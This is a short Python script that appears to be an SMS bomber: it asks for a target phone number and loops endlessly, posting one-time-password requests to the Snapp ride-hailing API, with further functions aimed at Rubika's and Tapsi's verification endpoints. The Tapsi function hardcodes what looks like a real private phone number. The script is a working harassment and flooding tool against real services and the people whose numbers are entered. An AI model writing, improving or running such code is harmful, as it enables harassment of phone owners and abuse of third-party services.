import requests as rq
from colorama import Fore as c
from time import sleep as sp
from os import system as s
from random import choice as ch

rd = c.RED
gr = c.GREEN
lrd = c.LIGHTRED_EX
lgr = c.LIGHTGREEN_EX
cy = c.CYAN

phone = input(f"{lrd}ENTER NUMBER {lgr}>>>")
sp(0.5)

s('cls')

def snap():
    usnap = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
    payload = {"cellphone":phone}
    send = rq.post(url=usnap, data=payload)
    if send.status_code == 200:
        print(f'{rd}[{lgr}+{rd}]{cy} SEND SNAPP')
    else:
        print(f'{lrd}[{gr}-{lrd}]{cy} NOT SEND SNAPP')
        
def rubika():
    ip = {"https": "127.0.0.1:8000"}
    urubika = "https://messengerg2c4.iranlms.ir/"
    ruH = {"Host": "messengerg2c4.iranlms.ir","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "text/plain","origin": "https://web.rubika.ir","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.rubika.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    ruD = {"api_version":"3","method":"sendCode","data":{"phone_number":phone,"send_type":"SMS"}}
    send = rq.post(urubika, headers=ruH, json=ruD, proxies=ip)
    if send.status_code == 200:
        print(f'{rd}[{lgr}+{rd}]{cy} SEND RUBIKA')
    else:
        print(f'{lrd}[{gr}-{lrd}]{cy} NOT SEND RUBIKA')
def tapsi():
    utap = 'https://api.tapsi.cab/api/v2/user'
    ptap = {"credential":{"phoneNumber":"09940113531","role":"PASSENGER"},"otpOption":"SMS"}
    send = rq.post(utap, data=ptap)
    if send.status_code == 200:
        print(f'{rd}[{lgr}+{rd}]{cy} SEND TAPSI')
    else:
        print(f'{rd}[{lgr}+{rd}]{cy} NOT SEND TAPSI')
site = ['snap',"rubika"]
# while 1:
#  s = ch(site)
#  if s == 'snap':
#      snap()
#  else:
#      rubika()    
while 1:
    snap()
    sp(4)